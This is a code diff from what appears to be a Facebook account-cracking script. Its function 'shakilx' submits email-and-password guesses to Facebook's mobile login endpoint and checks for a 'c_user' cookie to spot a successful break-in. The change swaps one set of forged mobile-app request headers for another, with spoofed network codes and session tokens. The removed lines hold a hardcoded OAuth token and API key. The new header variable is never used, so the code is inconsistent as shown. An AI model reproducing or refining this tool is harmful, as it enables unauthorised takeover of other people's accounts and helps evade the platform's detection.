@@ -238,19 +238,23 @@ def shakilx(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            head = {
-				'content-type':'application/x-www-form-urlencoded',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-type':'unknown',
-				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'api_key': '8114af471d039628db5c68cb127af936',
-				'user-agent':ua_string,
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-				'x-fb-connection-quality':'EXCELLENT',
-				'x-fb-friendly-name':'authenticate',
-				'accept-encoding':'gzip, deflate',
-				'x-fb-http-engine':	'Liger'}
+            headers={
+                                'User-Agent': ua,
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': '25227',
+'X-FB-SIM-HNI': '29752',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Content-Length': '706'}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
